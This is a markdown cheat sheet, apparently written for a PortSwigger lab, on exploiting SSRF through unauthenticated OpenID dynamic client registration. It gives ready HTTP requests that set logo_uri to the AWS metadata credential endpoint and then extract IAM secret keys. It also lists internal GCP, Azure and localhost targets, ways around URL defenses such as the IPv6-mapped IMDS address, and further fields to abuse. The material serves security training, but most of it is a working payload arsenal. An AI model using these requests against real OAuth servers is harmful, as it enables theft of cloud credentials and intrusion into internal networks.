# OAuth — OpenID dynamic client registration SSRF

OpenID Connect extends OAuth with a standardized discovery document at `/.well-known/openid-configuration`. Some providers expose a `/reg` (dynamic client registration) endpoint with no authentication. If the OAuth server fetches user-supplied URIs during registration (e.g., to display a logo), it becomes an SSRF vector — the attacker registers a client whose `logo_uri` points to an internal cloud metadata endpoint.

## Quick reference
```
# 1. Discover registration endpoint
GET /.well-known/openid-configuration
→ "registration_endpoint": "https://oauth-SERVER/reg"

# 2. Register client with Collaborator logo_uri (confirm SSRF)
POST /reg HTTP/1.1
Host: oauth-SERVER
Content-Type: application/json
{"redirect_uris":["https://example.com"],"logo_uri":"https://BURP-COLLABORATOR-SUBDOMAIN"}
→ 201 response with "client_id":"CLIENT-ID"

# 3. Trigger logo fetch (OAuth server fetches logo_uri server-side)
GET /client/CLIENT-ID/logo
→ Collaborator receives DNS + HTTP request (SSRF confirmed)

# 4. Re-register with internal metadata target
POST /reg
{"redirect_uris":["https://example.com"],"logo_uri":"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"}
→ new CLIENT-ID

# 5. Retrieve AWS credentials via logo endpoint
GET /client/NEW-CLIENT-ID/logo
→ response body = AWS IAM credentials JSON (SecretAccessKey, Token, etc.)
→ submit SecretAccessKey to solve lab
```

## Root cause
- **Unauthenticated dynamic client registration**: OpenID's `/reg` endpoint is meant for automated client registration but requires authorization. Misconfiguration leaves it open to anonymous registrations.
- **Server-side URI fetch**: When a client's logo is requested (`GET /client/ID/logo`), the OAuth server fetches `logo_uri` on behalf of the request. This is an SSRF: the attacker controls the URL the OAuth server fetches, including internal addresses like AWS IMDS (`169.254.169.254`).

## Find it
1. Browse to `/.well-known/openid-configuration` on any OAuth server — look for `registration_endpoint`.
2. Send `POST /reg` with minimal body `{"redirect_uris":["https://example.com"]}`. If it returns 201 with a `client_id`, registration is open.
3. Check if the provider has a logo display feature (`/client/ID/logo` or `GET /authorize` consent page showing logo).
4. Add `logo_uri` property with Collaborator URL; trigger the logo endpoint; check Collaborator for callback.

## Technique
1. Access `/.well-known/openid-configuration` → note `registration_endpoint` (typically `/reg`).
2. `POST /reg` with `{"redirect_uris":["https://example.com"],"logo_uri":"https://COLLABORATOR"}` → get `client_id`.
3. `GET /client/CLIENT-ID/logo` → Collaborator receives HTTP request → SSRF confirmed.
4. `POST /reg` again with `logo_uri: "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"` → new `client_id`.
5. `GET /client/NEW-CLIENT-ID/logo` → response contains AWS IAM credentials.
6. Extract `SecretAccessKey` and submit solution.

## Payload arsenal
```http
# Step 1 — discover registration endpoint
GET /.well-known/openid-configuration HTTP/1.1
Host: oauth-SERVER

# Step 2 — register with SSRF payload
POST /reg HTTP/1.1
Host: oauth-SERVER
Content-Type: application/json

{
  "redirect_uris": ["https://example.com"],
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}

# Step 3 — trigger server-side fetch
GET /client/CLIENT-ID/logo HTTP/1.1
Host: oauth-SERVER
```

```
# Other internal SSRF targets to try via logo_uri:
http://169.254.169.254/latest/meta-data/          (AWS IMDS root)
http://metadata.google.internal/computeMetadata/v1/ (GCP)
http://169.254.169.254/metadata/instance           (Azure)
http://localhost/admin                             (local admin panel)
http://192.168.0.1/                               (internal network)
```

## Bypasses
| Defense | Bypass |
|---|---|
| logo_uri must be HTTPS | Some SSRF targets respond on HTTP; try http:// anyway |
| logo_uri checked for valid image | OAuth server fetches regardless before validating type |
| Registration requires auth token | Check if Bearer token from existing login works for /reg |
| Redirect to IMDS blocked | Try IPv6 equivalent: `http://[::ffff:169.254.169.254]/...` |

## Exploitation walkthrough
`/.well-known/openid-configuration` → find `/reg` → POST with Collaborator `logo_uri` → `client_id` → `GET /client/ID/logo` → Collaborator hit (SSRF confirmed) → POST again with IMDS URL → new client_id → `GET /client/NEW-ID/logo` → AWS creds in response → submit.

## Chaining
- AWS `SecretAccessKey` → cloud environment access → [SSRF](../../SSRF/) escalation paths.
- Internal admin panel access via SSRF → [Access-control](../../Access-control/).
- SSRF to localhost services → [HTTP-Host-header-attacks](../../HTTP-Host-header-attacks/) style routing abuse.

## Tools
- **Burp Repeater** — send POST /reg and GET /client/ID/logo
- **Burp Collaborator** — verify server-side HTTP request (confirm SSRF before attacking internal targets)

## Labs

### SSRF via OpenID dynamic client registration [Practitioner]
`/.well-known/openid-configuration` exposes unauthenticated `/reg` endpoint. `POST /reg` with `logo_uri` = Collaborator URL → `GET /client/ID/logo` → Collaborator receives request (SSRF confirmed). Re-register with `logo_uri = http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/` → `GET /client/ID/logo` → AWS IAM credentials in response body. Key insight: OAuth consent pages that display client logos create a server-side SSRF vector when `logo_uri` is user-controlled and fetched server-side.

## Real-world notes
- Dynamic client registration is required by OpenID Connect Core but should enforce authorization. Unauthenticated `/reg` is a direct Shodan/nuclei finding in bug bounty.
- AWS IMDS v1 (`169.254.169.254`) has no authentication — one SSRF hit = full credential compromise. Many clouds now default to IMDSv2 (requires a PUT with TTL header first), but misconfigured instances still use v1.
- `logo_uri` is just one property. Also test `tos_uri`, `policy_uri`, `jwks_uri` — any URL the server fetches server-side.
- Combine with open redirect on OAuth server: SSRF through redirect chain to reach services blocked by IP allowlist.

## References
- https://portswigger.net/web-security/oauth/openid
- https://portswigger.net/web-security/ssrf
